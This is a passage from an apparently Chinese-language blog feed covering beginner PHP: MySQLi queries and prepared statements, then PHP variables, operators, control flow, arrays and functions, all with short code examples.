title="MySQLi介绍"></a>MySQLi介绍</h3><ul><li>MySQLi  extension(“ i “ 意为improved)MySQL扩展</li><li>MySQLi 只针对MySQL数据库</li><li>MySQLi是面向对象的,但也提供了API 接口</li><li>MySQLi支持预处理语句</li></ul><h3 id="MySQLi使用"><a href="#MySQLi使用" class="headerlink" title="MySQLi使用"></a>MySQLi使用</h3><p><strong>创建mysqli连接对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 连接数据库服务器</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        method:</span></span><br><span class="line"><span class="comment">        数据库服务器IP地址;</span></span><br><span class="line"><span class="comment">        数据库登录账号;</span></span><br><span class="line"><span class="comment">        登录密码;</span></span><br><span class="line"><span class="comment">        数据库名;</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;ntd&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;数据库连接失败&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>使用query()方法插入数据</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(name,pwd) values(&#x27;admin&#x27;,&#x27;123456&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;插入数据成功&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用query()方法更新数据</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set pwd=&#x27;456789&#x27; where name = &#x27;admin&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;修改数据成功&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用query()方法删除数据</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where id = 1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;删除数据成功&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用query()方法查询数据</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,name,pwd from user&quot;</span>;</span><br><span class="line"><span class="comment">// 获取查询结果，是一个对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据为空&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关闭数据库</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><ul><li>使用query()函数执行增删改操作返回bool值，表示执行是否成功</li><li>使用query()函数执行查询操作返回结果集，从结果集中获取数据</li></ul><h3 id="MySQLi的预处理"><a href="#MySQLi的预处理" class="headerlink" title="MySQLi的预处理"></a>MySQLi的预处理</h3><p><strong>为什么要使用预处理?</strong></p><ul><li>预处理语句用于执行多个相同的SQL语句，并且执行效率更高</li><li>预处理语句对于防止MySQL注入是非常有用的</li></ul><p><strong>预处理的使用</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 预处理及绑定</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">prepare</span>(<span class="string">&quot;insert into user (name,pwd) values (?,?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>,<span class="variable">$username</span>,<span class="variable">$userpwd</span>);</span><br><span class="line"><span class="comment">// 设置参数并执行</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;ntd1&#x27;</span>;</span><br><span class="line"><span class="variable">$userpwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;ntd2&#x27;</span>;</span><br><span class="line"><span class="variable">$userpwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;插入成功&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><p><strong>代码解析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;insert into user (name,pwd) values (?,?)&quot;</span></span><br></pre></td></tr></table></figure><p><strong>在 SQL 语句中，我们使用了问号(?)，在此我们可以将问号替换为整型，字符串，双精度浮点型和布尔值。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>,<span class="variable">$username</span>,<span class="variable">$userpwd</span>);</span><br></pre></td></tr></table></figure><ul><li>该函数绑定了SQL的参数，且告诉数据库参数的值</li></ul><p><strong>参数有以下四种类型：</strong></p><ul><li>i  -  integer（整形）</li><li>d  -  double（双精度浮点型）</li><li>s  -  string（字符串）</li><li>b  -  BLOG（binary large object：二进制大对象）</li></ul><p><strong>每个参数都需要指定类型</strong></p><ul><li>通过告诉数据库参数的数据类型，可以降低SQL注入的风险</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-Web应用基础5</title>
      <link href="/posts/webbase5.html"/>
      <url>/posts/webbase5.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web应用基础"><a href="#Web应用基础" class="headerlink" title="Web应用基础"></a>Web应用基础</h1><h2 id="走进PHP编程世界"><a href="#走进PHP编程世界" class="headerlink" title="走进PHP编程世界"></a>走进PHP编程世界</h2><h3 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h3><p><strong>PHP全称是Hypertext Preprocessor，超文本预处理器</strong></p><ul><li>PHP是一种创建动态交互性站点的开源语言</li><li>在服务器上执行</li><li>网络安全最常用方案以PHP为范本</li></ul><h3 id="PHP文件"><a href="#PHP文件" class="headerlink" title="PHP文件"></a>PHP文件</h3><p><strong>PHP文件是什么？</strong></p><ul><li>PHP文件可包含文本、HTML、JavaScript代码和PHP代码</li><li>PHP代码在服务器上执行，结果以纯HTML形式返回给浏览器</li><li>PHP文件的默认文件扩展名是”.php”</li></ul><h3 id="第一个PHP程序"><a href="#第一个PHP程序" class="headerlink" title="第一个PHP程序"></a>第一个PHP程序</h3><p><strong>在浏览器上输出文本”Hello World”</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>必须把PHP代码放置在<?php和?>标签之间</li><li>PHP中的每个代码行都必须以分号结束</li><li>在浏览器输出文本的指令：echo 和print</li><li>大小写敏感</li></ul><p><strong>注释</strong></p><ul><li>单行：&#x2F;&#x2F;</li><li>多行：&#x2F;*   *&#x2F;</li></ul><h2 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><strong>PHP 没有声明变量的命令，变量在第一次赋值时被创建</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span> = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><p><strong>变量创建时不需要指定数据类型，以赋值为准</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span> = <span class="number">100</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;张三&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>变量的命名规则</strong></p><ul><li>变量以$符号开始，后面跟着变量的名称</li><li>变量名必须以字母或者下划线字符开始</li><li>变量名只能包含字母、数字以及下划线 (A-Z、0-9 和_)</li><li>变量名不能包含空格</li><li>变量名是区分大小写的($y和$Y是两个不同的变量)</li></ul><h3 id="PHP输出"><a href="#PHP输出" class="headerlink" title="PHP输出"></a>PHP输出</h3><p><strong>PHP ehco语句</strong></p><ul><li>echo是一个语言结构，使用的时候可以不用加括号，也可以加上括号：echo或echo()</li></ul><p><strong>PHP print 语句</strong></p><ul><li>print同样是一个语言结构，可以使用括号，也可以不使用括号：print或 print()</li></ul><p><strong>PHP echo 和print语句的区别</strong></p><ul><li>echo - 可以输出一个或多个字符串</li><li>print - 只允许输出一个字符串</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>PHP常见数据类型</strong></p><p><strong>基本类型</strong></p><ul><li>String (字符串)，Integer (整型) ，Float (浮点型) ，Boolean (布尔型)</li></ul><p><strong>复合类型</strong></p><ul><li>Array (数组)，Object (对象)</li></ul><p><strong>字符串类型</strong></p><ul><li>在PHP中，只有一个字符串运算符</li><li>并置运算符(.)用于把两个字符串值连接起来</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$txt1</span> = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="variable">$txt2</span> = <span class="string">&quot;Arknights&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$txt1</span>.<span class="variable">$txt2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>整型和浮点型</strong></p><ul><li>var_dump()函数用于返回变量的数据类型和值</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">100</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="number">10.365</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>布尔类型</strong></p><ul><li>只能true或false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$y</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p><strong>PHP常用的运算符包括</strong></p><table><thead><tr><th align="center">运算符</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">赋值运算符</td><td align="center">&#x3D;</td></tr><tr><td align="center">算术运算符</td><td align="center">+、-、*、&#x2F;、%<br />+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、%&#x3D;</td></tr><tr><td align="center">自增自减运算符</td><td align="center">++、–</td></tr><tr><td align="center">关系运算符</td><td align="center">&gt;、&lt;、&gt;&#x3D;、&lt;&#x3D;、<br />&#x3D;&#x3D;（相等）  !&#x3D;（不相等）<br />&#x3D;&#x3D;&#x3D;（全等）  !&#x3D;&#x3D;（不全等）</td></tr><tr><td align="center">逻辑运算符</td><td align="center">&amp;&amp;、||、！<br />注意：除零值以外，所有值都为真</td></tr></tbody></table><p><strong>相等和全等案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">100</span>;</span><br><span class="line">    &amp;y = <span class="string">&quot;100&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> == <span class="variable">$y</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span> === <span class="variable">$y</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP流程控制"><a href="#PHP流程控制" class="headerlink" title="PHP流程控制"></a>PHP流程控制</h2><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p><strong>大多数计算机语言的流程都可以分为三种</strong></p><ul><li>顺序结构</li><li>选择结构</li><li>循环结构</li></ul><p><strong>顺序结构</strong></p><ul><li>代码的执行由上而下依次执行</li></ul><p><strong>选择结构</strong></p><ul><li>代码的执行根据不同的条件，执行不同的语句。根据条件的数量不同，分以下三种：if语句、if  else语句和if  elseif语句</li></ul><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><p><strong>if语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">语句块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>if else语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">语句块<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">语句块<span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>if else if语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式<span class="number">1</span>)&#123;</span><br><span class="line">语句块<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">2</span>)&#123;</span><br><span class="line">语句块<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式<span class="number">3</span>)&#123;</span><br><span class="line">语句块<span class="number">3</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">其他语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择结构案例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">// if</span></span><br><span class="line">    <span class="variable">$age</span> = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$age</span> &lt; <span class="number">18</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;禁止访问&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// else if</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span> &gt; <span class="variable">$b</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><ul><li><p>重复执行的动作</p></li><li><p>PHP支持for、while、do-while、foreach等不同类型的循环</p></li><li><p>其中foreach主要用于遍历可迭代对象</p></li></ul><p><strong>for语句</strong></p><ul><li>语法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>;表达式<span class="number">2</span>;表达式<span class="number">3</span>)&#123;</span><br><span class="line">语句序列;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.5.1.png" alt="12.5.1"></p><p><strong>while语句</strong></p><ul><li>语法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(条件表达式)&#123;</span><br><span class="line">语句序列;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.5.2.png" alt="12.5.2"></p><p><strong>do-while语句</strong></p><ul><li>语法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">语句序列</span><br><span class="line">&#125;while(条件表达式);</span><br></pre></td></tr></table></figure><p><img src="/../img/img_artical/net_sec/12.5.3.png" alt="12.5.3"></p><p><strong>break和continue语句</strong></p><ul><li>break用于跳出循环</li><li>continue用于结束一次循环，继续执行下一次循环</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><ul><li><p>数组是一个能在单个变量中存储多个值的特殊变量</p></li><li><p>在PHP中，array()函数用于创建数组</p></li></ul><p><strong>在PHP中，常用的有两种类型的数组：</strong></p><ul><li><p>数值数组-带有数字ID键的数组</p></li><li><p>关联数组- 带有指定的键的数组，每个键关联一个值</p></li><li><p>数值数组</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$users</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 手动分配键</span></span><br><span class="line">    <span class="variable">$users</span>[<span class="number">0</span>] = <span class="string">&quot;tedu&quot;</span>;</span><br><span class="line">    <span class="variable">$users</span>[<span class="number">1</span>] = <span class="string">&quot;tedu2&quot;</span>;</span><br><span class="line">    <span class="variable">$users</span>[<span class="number">2</span>] = <span class="string">&quot;tedu3&quot;</span>;</span><br><span class="line">    <span class="comment">// 自动分配ID键</span></span><br><span class="line">    <span class="variable">$users</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>);</span><br><span class="line">    <span class="comment">// 计算数组长度</span></span><br><span class="line">    <span class="variable">$arrlength</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$users</span>);</span><br><span class="line">    <span class="comment">// 打印数组元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span> ; <span class="variable">$i</span> &lt; <span class="variable">$arrlength</span> ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$users</span>[<span class="variable">$i</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>关联数组</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ages</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// $ages[&#x27;zhangsan&#x27;] = 18;</span></span><br><span class="line">    <span class="comment">// $ages[&#x27;lisi&#x27;] = 19;</span></span><br><span class="line">    <span class="comment">// $ages[&#x27;wangwu&#x27;] = 20;</span></span><br><span class="line">    <span class="variable">$ages</span> = <span class="keyword">array</span>(<span class="string">&quot;zhangsan&quot;</span> =&gt; <span class="number">18</span> , <span class="string">&quot;lisi&quot;</span> =&gt; <span class="number">19</span> , <span class="string">&quot;wangwu&quot;</span> =&gt; <span class="number">20</span>);</span><br><span class="line">    <span class="variable">$arrlength</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$ages</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$ages</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;key:  &quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;   value:  &quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP函数和对象"><a href="#PHP函数和对象" class="headerlink" title="PHP函数和对象"></a>PHP函数和对象</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li>函数的作用就是封装和重用。</li><li>函数中的代码，只有在调用时，才会被执行。</li><li>语法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funName</span>(<span class="params">形参</span>)</span>&#123;</span><br><span class="line">语句块;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line"><span class="title function_ invoke__">funName</span>(实参);</span><br></pre></td></tr></table></figure><ul><li>函数使用案例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myMax</span>(<span class="params"><span class="variable">$a</span> , <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> &gt; <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$max</span> = <span class="title function_ invoke__">myMax</span>(<span class="number">100</span> , <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$max</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类和对象"><a href="#类和对象" class="headerlink" 